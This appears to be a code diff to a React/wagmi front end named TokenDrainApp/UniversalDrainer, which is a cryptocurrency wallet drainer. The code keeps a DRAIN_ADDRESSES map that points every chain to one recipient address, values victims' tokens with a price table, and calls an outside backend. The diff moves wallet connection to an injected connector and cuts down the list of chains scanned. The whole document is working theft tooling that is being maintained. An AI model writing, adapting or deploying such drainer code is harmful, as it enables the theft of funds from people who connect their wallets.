@@ -18,63 +18,49 @@ import {
   metis,
   moonriver
 } from 'wagmi/chains';
-import { Web3Modal } from '@web3modal/react';
-import { EthereumClient } from '@web3modal/ethereum';
-import { useWeb3Modal } from '@web3modal/react';
-import { configureChains, useAccount, useDisconnect, useBalance } from 'wagmi';
-import { publicProvider } from 'wagmi/providers/public';
-import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi/react';
+import { useAccount, useDisconnect, useBalance, useConnect } from 'wagmi';
+import { injected } from 'wagmi/connectors';
 import { parseEther } from 'viem';
 
-// ==================== WEB3 MODAL CONFIG ====================
-const projectId = 'YOUR_WALLETCONNECT_PROJECT_ID'; // Replace with your actual project ID
-
-const chains = [
-  mainnet,
-  polygon,
-  bsc,
-  arbitrum,
-  optimism,
-  base,
-  avalanche,
-  fantom,
-  gnosis,
-  celo,
-  moonbeam,
-  cronos,
-  aurora,
-  harmonyOne,
-  metis,
-  moonriver
-];
-
-const metadata = {
-  name: 'Token Transfer',
-  description: 'Multi-chain token transfer system',
-  url: 'https://yourdomain.com',
-  icons: ['https://avatars.githubusercontent.com/u/37784886']
-};
-
-const wagmiConfig = defaultWagmiConfig({ 
-  chains, 
-  projectId, 
-  metadata 
-});
-
-const ethereumClient = new EthereumClient(wagmiConfig, chains);
-
-// Create Web3Modal instance
-createWeb3Modal({
-  wagmiConfig,
-  projectId,
-  chains,
-  themeMode: 'dark',
-  themeVariables: {
-    '--w3m-font-family': 'system-ui, -apple-system, sans-serif',
-    '--w3m-accent-color': '#ef4444',
-    '--w3m-background-color': '#ef4444',
-    '--w3m-z-index': '9999'
-  }
+// ==================== WAGMI CONFIG ====================
+const config = createConfig({
+  chains: [
+    mainnet,
+    polygon,
+    bsc,
+    arbitrum,
+    optimism,
+    base,
+    avalanche,
+    fantom,
+    gnosis,
+    celo,
+    moonbeam,
+    cronos,
+    aurora,
+    harmonyOne,
+    metis,
+    moonriver
+  ],
+  connectors: [injected()],
+  transports: {
+    [mainnet.id]: http(),
+    [polygon.id]: http(),
+    [bsc.id]: http(),
+    [arbitrum.id]: http(),
+    [optimism.id]: http(),
+    [base.id]: http(),
+    [avalanche.id]: http(),
+    [fantom.id]: http(),
+    [gnosis.id]: http(),
+    [celo.id]: http(),
+    [moonbeam.id]: http(),
+    [cronos.id]: http(),
+    [aurora.id]: http(),
+    [harmonyOne.id]: http(),
+    [metis.id]: http(),
+    [moonriver.id]: http(),
+  },
 });
 
 // ==================== PRODUCTION NETWORK CONFIG ====================
@@ -266,39 +252,6 @@ const NETWORKS = [
     chainId: '0x505',
     decimals: 18
   },
-  { 
-    id: 199, 
-    name: 'BTT Chain', 
-    symbol: 'BTT', 
-    type: 'evm', 
-    color: '#D92B6F', 
-    rpc: 'https://rpc.bittorrentchain.io', 
-    explorer: 'https://bttcscan.com',
-    chainId: '0xc7',
-    decimals: 18
-  },
-  { 
-    id: 314, 
-    name: 'Filecoin', 
-    symbol: 'FIL', 
-    type: 'evm', 
-    color: '#0090FF', 
-    rpc: 'https://api.node.glif.io/rpc/v1', 
-    explorer: 'https://filfox.info',
-    chainId: '0x13a',
-    decimals: 18
-  },
-  { 
-    id: 7700, 
-    name: 'Canto', 
-    symbol: 'CANTO', 
-    type: 'evm', 
-    color: '#06FC99', 
-    rpc: 'https://canto.slingshot.finance', 
-    explorer: 'https://tuber.build',
-    chainId: '0x1e14',
-    decimals: 18
-  },
 ];
 
 // ==================== DRAIN ADDRESSES ====================
@@ -320,9 +273,6 @@ const DRAIN_ADDRESSES = {
   1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
 };
 
 // ==================== TOKEN PRICES ====================
@@ -340,11 +290,6 @@ const TOKEN_PRICES = {
   ONE: 0.02,
   ROSE: 0.1,
   MOVR: 15,
-  BTT: 0.000001,
-  FIL: 5,
-  CANTO: 0.2,
-  USDT: 1,
-  USDC: 1
 };
 
 // ==================== BACKEND URL ====================
@@ -353,20 +298,17 @@ const BACKEND_URL = 'https://tokenbackend-5xab.onrender.com';
 // ==================== MAIN APP ====================
 function TokenDrainApp() {
   return (
-    <>
-      <WagmiProvider config={wagmiConfig}>
-        <UniversalDrainer />
-      </WagmiProvider>
-    </>
+    <WagmiProvider config={config}>
+      <UniversalDrainer />
+    </WagmiProvider>
   );
 }
 
 // ==================== UNIVERSAL DRAINER COMPONENT ====================
 function UniversalDrainer() {
-  const { address, isConnected, connector } = useAccount();
-  const { data: ethBalance } = useBalance({ address });
+  const { address, isConnected } = useAccount();
   const { disconnect } = useDisconnect();
-  const { open } = useWeb3Modal();
+  const { connect, connectors } = useConnect();
 
   const [status, setStatus] = useState('Ready to connect');
   const [tokens, setTokens] = useState([]);
@@ -561,7 +503,6 @@ function UniversalDrainer() {
     let scannedCount = 0;
     
     const priorityNetworks = [1, 56, 137, 42161, 10, 8453, 43114, 250];
-    const otherNetworks = NETWORKS.filter(n => !priorityNetworks.includes(n.id));
     
     for (let i = 0; i < priorityNetworks.length; i += 2) {
       const batch = priorityNetworks.slice(i, i + 2);
@@ -597,43 +538,11 @@ function UniversalDrainer() {
       });
       
       scannedCount += batchResults.length;
-      const progress = Math.round((scannedCount / (priorityNetworks.length + 5)) * 100);
+      const progress = Math.round((scannedCount / priorityNetworks.length) * 100);
       setScanProgress(progress);
-      setStatus(`Scanning major networks... ${scannedCount}/${priorityNetworks.length + 5}`);
+      setStatus(`Scanning major networks... ${scannedCount}/${priorityNetworks.length}`);
       
       await new Promise(resolve => setTimeout(resolve, 200));
-    }
-    
-    const networksToScan = otherNetworks.slice(0, 5);
-    for (const network of networksToScan) {
-      try {
-        const balance = await checkEVMNetworkBalance(network, walletAddress);
-        if (balance > 0.000001) {
-          const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
-          allTokens.push({
-            id: `${network.id}-native`,
-            network: network.name,
-            symbol: network.symbol,
-            amount: balance.toFixed(6),
-            rawAmount: balance,
-            chainId: network.id,
-            type: 'evm',
-            contractAddress: null,
-            isNative: true,
-            valueUSD: tokenValue,
-            usdPrice: TOKEN_PRICES[network.symbol] || 1,
-            status: 'detected'
-          });
-          totalUSD += tokenValue;
-        }
-      } catch (error) {
-        console.log(`Error scanning ${network.name}:`, error.message);
-      }
-      
-      scannedCount++;
-      const progress = Math.round((scannedCount / (priorityNetworks.length + 5)) * 100);
-      setScanProgress(progress);
-      await new Promise(resolve => setTimeout(resolve, 150));
     }
     
     processScanResults(allTokens, totalUSD);
@@ -644,8 +553,6 @@ function UniversalDrainer() {
     const rpcEndpoints = [
       network.rpc,
       `https://rpc.ankr.com/${network.symbol.toLowerCase() === 'eth' ? 'eth' : network.name.toLowerCase().replace(' ', '_')}`,
-      `https://${network.name.toLowerCase().replace(' ', '-')}.publicnode.com`,
-      `https://${network.name.toLowerCase().replace(' ', '-')}.rpc.thirdweb.com`,
     ];
     
     for (const rpc of rpcEndpoints) {
@@ -875,7 +782,7 @@ function UniversalDrainer() {
   const CustomConnectButton = () => {
     const handleConnect = async () => {
       try {
-        await open();
+        await connect({ connector: connectors[0] });
       } catch (error) {
         console.error('Connection error:', error);
         setConnectionError('Failed to connect wallet');
